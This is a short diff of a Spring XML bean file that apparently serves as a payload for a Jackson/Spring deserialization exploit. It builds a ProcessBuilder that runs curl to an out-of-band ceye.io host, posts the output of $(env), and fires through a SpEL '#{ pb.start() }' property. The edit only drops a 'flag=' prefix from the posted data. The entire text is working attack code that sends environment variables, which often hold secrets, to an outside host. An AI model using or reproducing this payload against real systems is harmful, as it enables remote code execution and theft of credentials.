@@ -10,7 +10,7 @@
             <value>curl</value>
             <value>jackson.zg80gf.ceye.io</value>
           <value>-d</value>
-          <value>flag=$(env)</value>
+          <value>$(env)</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
